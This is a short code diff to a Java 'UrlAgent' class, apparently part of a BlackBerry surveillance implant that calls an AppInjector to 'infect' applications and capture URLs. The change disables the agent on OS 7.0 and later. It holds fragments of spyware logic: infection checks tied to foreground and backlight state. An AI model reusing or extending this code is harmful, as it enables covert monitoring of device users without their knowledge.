@@ -41,6 +41,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     AppInjector appInjector;
 
     private boolean seen = true;
+    private boolean unsupported = false;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
@@ -55,6 +56,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
         if (Device.getInstance().atLeast(6, 0)) {
             seen = false;
+        }
+
+        if (Device.getInstance().atLeast(7, 0)) {
+            unsupported = true;
         }
     }
 
@@ -78,6 +83,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef DEBUG
         debug.trace("actualStart");
         //#endif
+
+        if (unsupported) {
+            return;
+        }
 
         AppListener.getInstance().addApplicationObserver(this);
         AppListener.getInstance().addBacklightObserver(this);
@@ -119,6 +128,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
+        if (unsupported) {
+            return;
+        }
+
         if (appInjector.isInfected() && Backlight.isEnabled()
                 && isAppForeground) {
             //#ifdef DEBUG
@@ -172,7 +185,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
 
             appInjector.infect();
-            
+
             if (Device.getInstance().atLeast(6, 0)) {
                 seen = false;
             }
